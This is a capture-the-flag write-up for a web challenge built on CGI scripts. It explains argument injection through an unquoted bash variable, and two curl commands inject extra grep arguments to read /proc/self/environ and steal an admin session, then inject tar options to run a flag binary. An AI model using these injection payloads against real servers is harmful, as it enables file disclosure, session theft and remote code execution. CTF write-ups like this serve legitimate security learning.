# Old School

* Round: 32 (2023/03)
* Category: Web
* Points: 125
* Solves: 4

## Description

Reject modern web frameworks! Let's go back to the era of CGI scripts.

## Solution

Unquoted bash variable will be splited by space so you can do argument injection on `grep` to read arbitrary files. Getting the `ADMIN_SESSION` from `/proc/self/environ` then use another argument injection on `tar` to get RCE.

```bash
sess=$(curl -v 'http://ictf2.maple3142.net:8763/cgi-bin/match' -d 'text=a&regex=^.* /proc/self/environ -a' | tr '\0' '\n' | grep ADMIN_SESSION | awk -F= '{print $2}')
curl -H "Cookie: session=$sess" 'http://ictf2.maple3142.net:8763/cgi-bin/getlogs' -d 'target= -I /readflag' -v --output -
```
